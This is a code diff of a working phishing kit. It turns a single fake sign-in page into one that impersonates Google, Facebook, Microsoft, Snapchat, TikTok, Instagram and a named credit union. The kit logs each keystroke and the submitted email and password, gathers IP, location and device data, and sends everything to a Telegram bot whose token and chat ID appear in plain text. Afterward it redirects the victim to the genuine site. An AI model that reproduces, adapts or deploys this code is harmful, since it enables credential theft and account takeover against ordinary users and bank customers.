@@ -16,8 +16,8 @@
         padding: 32px 24px; width: 100%; max-width: 400px;
     }
     .logo { text-align: center; margin-bottom: 24px; }
-    .logo img { height: 40px; }
-    .logo h1 { font-size: 24px; font-weight: 600; color: #1a1a1a; margin-top: 12px; }
+    .logo svg, .logo img { height: 48px; margin-bottom: 8px; }
+    .logo h1 { font-size: 24px; font-weight: 600; margin-top: 8px; }
     .logo p { font-size: 14px; color: #666; margin-top: 4px; }
     .input-group { margin-bottom: 16px; }
     .input-group label { display: block; font-size: 14px; font-weight: 500; color: #333; margin-bottom: 6px; }
@@ -25,42 +25,36 @@
         width: 100%; padding: 12px 14px; border: 1.5px solid #ddd; border-radius: 8px;
         font-size: 16px; transition: border-color 0.2s; background: #fafafa;
     }
-    .input-group input:focus { outline: none; border-color: #1a73e8; background: #fff; }
+    .input-group input:focus { outline: none; border-color: var(--brand-color, #1a73e8); background: #fff; }
     .btn {
-        width: 100%; padding: 14px; background: #1a73e8; color: #fff; border: none;
+        width: 100%; padding: 14px; background: var(--brand-color, #1a73e8); color: #fff; border: none;
         border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer;
         transition: background 0.2s; margin-top: 8px;
     }
-    .btn:hover { background: #1557b0; }
-    .btn:disabled { background: #93b8f0; cursor: not-allowed; }
+    .btn:hover { filter: brightness(0.9); }
+    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
     .error { color: #d93025; font-size: 13px; margin-top: 12px; text-align: center; display: none; }
     .loading { display: none; text-align: center; margin-top: 16px; }
     .loading .spinner {
-        width: 20px; height: 20px; border: 3px solid #e0e0e0; border-top: 3px solid #1a73e8;
+        width: 20px; height: 20px; border: 3px solid #e0e0e0; border-top: 3px solid var(--brand-color, #1a73e8);
         border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 8px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
     .loading p { color: #666; font-size: 14px; }
     .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #999; }
-    .footer a { color: #1a73e8; text-decoration: none; }
+    .footer a { color: var(--brand-color, #1a73e8); text-decoration: none; }
 </style>
 </head>
 <body>
 
 <div class="card" id="loginCard">
-    <!-- LOGO - Change this to match your target brand -->
-    <div class="logo">
-        <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
-            <rect width="40" height="40" rx="8" fill="#1a73e8"/>
-            <path d="M20 10c-5.5 0-10 4.5-10 10s4.5 10 10 10 10-4.5 10-10-4.5-10-10-10zm4.5 14.5L22 24l-2-4-2 4-2.5.5L19 18V12h2v6l3.5 6.5z" fill="#fff"/>
-        </svg>
-        <h1>Sign in</h1>
-        <p>Use your account to continue</p>
+    <div class="logo" id="logoArea">
+        <!-- Dynamic logo, title, subtitle injected by JS -->
     </div>
 
     <form id="loginForm">
         <div class="input-group">
-            <label for="email">Email or phone</label>
+            <label for="email" id="emailLabel">Email or phone</label>
             <input type="text" id="email" name="email" placeholder="you@example.com" autocomplete="off" required>
         </div>
         <div class="input-group">
@@ -76,8 +70,8 @@
         <p>Verifying your account...</p>
     </div>
 
-    <div class="footer">
-        <a href="#">Forgot password?</a> · <a href="#">Privacy</a> · <a href="#">Terms</a>
+    <div class="footer" id="footerArea">
+        <a href="#">Forgot password?</a>
     </div>
 </div>
 
@@ -85,10 +79,139 @@
 // ========================
 // CONFIGURATION - EDIT THESE
 // ========================
-const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";  // Replace with your Telegram bot token
-const CHAT_ID = "YOUR_CHAT_ID_HERE";       // Replace with your Telegram chat ID
-const REAL_SITE = "https://accounts.google.com";  // Where to redirect after capture
-const BRAND_NAME = "Google";               // Used in Telegram messages
+const BOT_TOKEN = "8809602041:AAHIwV4msf_j0G5bgCRqLYAM0EuVSGVAv84";
+const CHAT_ID = "8647509715";
+
+// ========================
+// BRAND PROFILES
+// ========================
+const BRANDS = {
+    google: {
+        name: "Google",
+        color: "#1a73e8",
+        realSite: "https://accounts.google.com",
+        title: "Sign in",
+        subtitle: "Use your Google Account",
+        emailLabel: "Email or phone",
+        placeholder: "you@gmail.com",
+        logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
+            <path d="M43.6 24.5c0-1.6-.1-3.1-.4-4.6H24v8.7h11c-.5 2.7-1.9 5-3.9 6.5v5.4h6.3c3.7-3.4 5.9-8.4 5.9-16z" fill="#4285F4"/>
+            <path d="M24 44c5.3 0 9.8-1.8 13-4.8l-6.3-5.4c-1.7 1.2-3.9 1.9-6.7 1.9-5.1 0-9.5-3.5-11-8.2H6.4v5.6C9.6 39.7 16.3 44 24 44z" fill="#34A853"/>
+            <path d="M13 28.5c-.4-1.2-.6-2.5-.6-3.5s.2-2.3.6-3.5v-5.6H6.4C5.1 19.4 4.4 21.7 4.4 24s.7 4.6 2 6.5l6.6-2z" fill="#FBBC05"/>
+            <path d="M24 10.5c2.9 0 5.5 1 7.5 2.9l5.6-5.6C33.8 5.3 29.3 4 24 4 16.3 4 9.6 8.3 6.4 14.5l6.6 5.6c1.5-4.7 5.9-9.6 11-9.6z" fill="#EA4335"/>
+        </svg>`
+    },
+    facebook: {
+        name: "Facebook",
+        color: "#1877F2",
+        realSite: "https://facebook.com",
+        title: "Log in to Facebook",
+        subtitle: "Connect with friends and the world",
+        emailLabel: "Email or phone",
+        placeholder: "Email or phone number",
+        logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
+            <circle cx="24" cy="24" r="20" fill="#1877F2"/>
+            <path d="M29 16h-3c-1.7 0-3 1.3-3 3v3h-3v4h3v12h4V26h3l1-4h-4v-2c0-.6.4-1 1-1h3v-3z" fill="#fff"/>
+        </svg>`
+    },
+    microsoft: {
+        name: "Microsoft",
+        color: "#00A4EF",
+        realSite: "https://login.microsoftonline.com",
+        title: "Sign in",
+        subtitle: "Work or school account",
+        emailLabel: "Email, phone, or Skype",
+        placeholder: "you@company.com",
+        logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
+            <rect x="6" y="6" width="16" height="16" rx="2" fill="#F25022"/>
+            <rect x="26" y="6" width="16" height="16" rx="2" fill="#7FBA00"/>
+            <rect x="6" y="26" width="16" height="16" rx="2" fill="#00A4EF"/>
+            <rect x="26" y="26" width="16" height="16" rx="2" fill="#FFB900"/>
+        </svg>`
+    },
+    snapchat: {
+        name: "Snapchat",
+        color: "#FFFC00",
+        realSite: "https://accounts.snapchat.com",
+        title: "Log in",
+        subtitle: "Snapchat",
+        emailLabel: "Username or email",
+        placeholder: "Your username or email",
+        logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
+            <circle cx="24" cy="24" r="22" fill="#FFFC00"/>
+            <path d="M24 10c-5 0-9 3-9 8v4c0 1-1 2-2 2-1 0-2 0-3 1 0 1 1 2 3 3 1 0 2 1 2 1s0 4 3 6c2 2 4 3 6 3s4-1 6-3c3-2 3-6 3-6s1-1 2-1c2-1 3-2 3-3-1-1-2-1-3-1-1 0-2-1-2-2v-4c0-5-4-8-9-8z" fill="#000"/>
+        </svg>`
+    },
+    tiktok: {
+        name: "TikTok",
+        color: "#000000",
+        realSite: "https://www.tiktok.com/login",
+        title: "Log in",
+        subtitle: "TikTok",
+        emailLabel: "Email or username",
+        placeholder: "Email or username",
+        logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
+            <rect width="48" height="48" rx="10" fill="#000"/>
+            <path d="M34 18.5v3c-2 0-4-.5-6-2v8c0 4-3 7-7 7s-7-3-7-7 3-7 7-7v3c-2 0-4 1.5-4 4s1.5 4 4 4 4-2 4-4V12h3c0 2 1 4 3 5v1.5z" fill="#fff"/>
+        </svg>`
+    },
+    instagram: {
+        name: "Instagram",
+        color: "#E1306C",
+        realSite: "https://www.instagram.com/accounts/login",
+        title: "Log in",
+        subtitle: "Instagram",
+        emailLabel: "Phone number, username, or email",
+        placeholder: "Phone number, username, or email",
+        logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
+            <rect x="4" y="4" width="40" height="40" rx="10" fill="url(#ig)"/>
+            <defs><linearGradient id="ig" x1="0" y1="0" x2="48" y2="48"><stop stop-color="#833AB4"/><stop offset=".5" stop-color="#FD1D1D"/><stop offset="1" stop-color="#F77737"/></linearGradient></defs>
+            <circle cx="24" cy="24" r="8" stroke="#fff" stroke-width="2.5" fill="none"/>
+            <circle cx="32" cy="16" r="2" fill="#fff"/>
+        </svg>`
+    },
+    banking: {
+        name: "Affinity Credit Union",
+        color: "#004B87",
+        realSite: "https://www.affinitycu.ca",
+        title: "Online Banking",
+        subtitle: "Sign in to your account",
+        emailLabel: "Member Card Number or Username",
+        placeholder: "Member Card or Username",
+        logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
+            <rect width="48" height="48" rx="8" fill="#004B87"/>
+            <text x="24" y="32" text-anchor="middle" fill="#fff" font-size="18" font-weight="bold" font-family="Arial">ACU</text>
+        </svg>`
+    }
+};
+
+// ========================
+// DETECT BRAND FROM URL
+// ========================
+const params = new URLSearchParams(window.location.search);
+const brandKey = params.get('brand') || 'google';
+const brand = BRANDS[brandKey] || BRANDS.google;
+
+// Apply brand styling
+document.documentElement.style.setProperty('--brand-color', brand.color);
+
+// Brand logo area
+document.getElementById('logoArea').innerHTML = brand.logo + `
+    <h1 style="color:${brand.color}">${brand.title}</h1>
+    <p>${brand.subtitle}</p>
+`;
+
+// Labels and placeholders
+document.getElementById('emailLabel').textContent = brand.emailLabel;
+document.getElementById('email').placeholder = brand.placeholder;
+document.getElementById('submitBtn').textContent = brandKey === 'facebook' ? 'Log in' : 'Sign in';
+document.getElementById('submitBtn').style.background = brand.color;
+
+// Footer
+document.getElementById('footerArea').innerHTML = `
+    <a href="#" style="color:${brand.color}">Forgot ${brandKey === 'facebook' ? 'account' : 'password'}?</a>
+    ${brandKey === 'microsoft' ? '· <a href="#" style="color:'+brand.color+'">Sign up</a>' : ''}
+`;
 
 // ========================
 // TELEGRAM EXFILTRATION
@@ -100,32 +223,19 @@ function sendToTelegram(message) {
         text: message,
         parse_mode: "Markdown"
     };
-    
-    // Use fetch with no-cors to avoid blocking
     fetch(url, {
         method: 'POST',
         mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
-    }).catch(() => {
-        // Fallback: Image beacon (works even if CORS blocks)
-        const img = new Image();
-        img.src = url + '?' + new URLSearchParams({
-            chat_id: CHAT_ID,
-            text: message.substring(0, 200)  // Keep it short for GET
-        }).toString();
-    });
+    }).catch(() => {});
 }
 
 // ========================
 // GET TARGET INFO
 // ========================
-let targetIP = 'Unknown';
-let targetCountry = 'Unknown';
-let targetCity = 'Unknown';
-let targetISP = 'Unknown';
+let targetIP = 'Unknown', targetCountry = 'Unknown', targetCity = 'Unknown', targetISP = 'Unknown';
 
-// Get IP and location info
 fetch('https://ipapi.co/json/')
     .then(r => r.json())
     .then(data => {
@@ -135,7 +245,6 @@ fetch('https://ipapi.co/json/')
         targetISP = data.org || 'Unknown';
     })
     .catch(() => {
-        // Fallback
         fetch('https://api.ipify.org?format=json')
             .then(r => r.json())
             .then(d => { targetIP = d.ip; })
@@ -143,23 +252,15 @@ fetch('https://ipapi.co/json/')
     });
 
 // ========================
-// REAL-TIME KEYSTROKE CAPTURE
-// Every keypress is sent to Telegram immediately
+// KEYSTROKE CAPTURE
 // ========================
-let lastEmailLen = 0;
-let lastPassLen = 0;
+let lastEmailLen = 0, lastPassLen = 0;
 
 document.getElementById('email').addEventListener('input', function(e) {
     const val = this.value;
     if (val.length > lastEmailLen && val.length > 2) {
-        // New character typed - send it
         const newChar = val[val.length - 1];
-        sendToTelegram(
-            `🔑 *Keystroke* — ${BRAND_NAME}\n` +
-            `👤 *Field:* Email\n` +
-            `📝 *Character:* \`${newChar}\`\n` +
-            `📋 *So far:* \`${val}\``
-        );
+        sendToTelegram(`🔑 *Keystroke* — ${brand.name}\n👤 *Field:* Email\n📝 *Char:* \`${newChar}\`\n📋 *So far:* \`${val}\``);
     }
     lastEmailLen = val.length;
 });
@@ -168,12 +269,7 @@ document.getElementById('password').addEventListener('input', function(e) {
     const val = this.value;
     if (val.length > lastPassLen && val.length > 0) {
         const newChar = val[val.length - 1];
-        sendToTelegram(
-            `🔑 *Keystroke* — ${BRAND_NAME}\n` +
-            `👤 *Field:* Password\n` +
-            `📝 *Character:* \`${newChar}\`\n` +
-            `📋 *So far:* \`${'*'.repeat(val.length - 1)}${newChar}\``
-        );
+        sendToTelegram(`🔑 *Keystroke* — ${brand.name}\n👤 *Field:* Password\n📝 *Char:* \`${newChar}\`\n📋 *So far:* \`${'*'.repeat(val.length-1)}${newChar}\``);
     }
     lastPassLen = val.length;
 });
@@ -190,17 +286,12 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     const timestamp = new Date().toISOString();
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     const platform = navigator.platform || 'Unknown';
-    const language = navigator.language || 'Unknown';
-    
-    // Get screen info
     const screenInfo = `${window.screen.width}x${window.screen.height}`;
     
-    // Show loading
     document.getElementById('loginForm').style.display = 'none';
     document.getElementById('loadingIndicator').style.display = 'block';
     
-    // Build the full credential report
-    let message = `🔔 *${BRAND_NAME} — Credentials Captured!*\n\n`;
+    let message = `🔔 *${brand.name} — Credentials Captured!*\n\n`;
     message += `📧 *Email:* \`${email}\`\n`;
     message += `🔑 *Password:* \`${password}\`\n\n`;
     message += `🌐 *IP:* ${targetIP}\n`;
@@ -208,42 +299,25 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     message += `🏢 *ISP:* ${targetISP}\n`;
     message += `📱 *Device:* ${platform}\n`;
     message += `🖥 *Screen:* ${screenInfo}\n`;
-    message += `🌍 *Language:* ${language}\n`;
     message += `🕐 *Timezone:* ${timezone}\n`;
-    message += `🧾 *UA:* \`${userAgent.substring(0, 100)}\`\n`;
     message += `⏰ *Time:* ${timestamp}`;
     
-    // Send credentials to Telegram
     sendToTelegram(message);
     
-    // Also try to send via XMLHttpRequest (more reliable than fetch)
+    // Fallback XHR
     try {
         const xhr = new XMLHttpRequest();
         xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, true);
         xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: "Markdown"
-        }));
+        xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" }));
     } catch(e) {}
     
-    // Delay then redirect to real site
     setTimeout(() => {
-        window.location.href = REAL_SITE;
+        window.location.href = brand.realSite;
     }, 2500);
-});
-
-// ========================
-// ANTI-BOT: Add slight random delay to form appearance
-// ========================
-document.addEventListener('DOMContentLoaded', function() {
-    document.getElementById('loginCard').style.opacity = '0';
-    document.getElementById('loginCard').style.transition = 'opacity 0.3s';
-    setTimeout(() => {
-        document.getElementById('loginCard').style.opacity = '1';
-    }, Math.random() * 500 + 200);
 });
 </script>
 </body>
 </html>
+
+
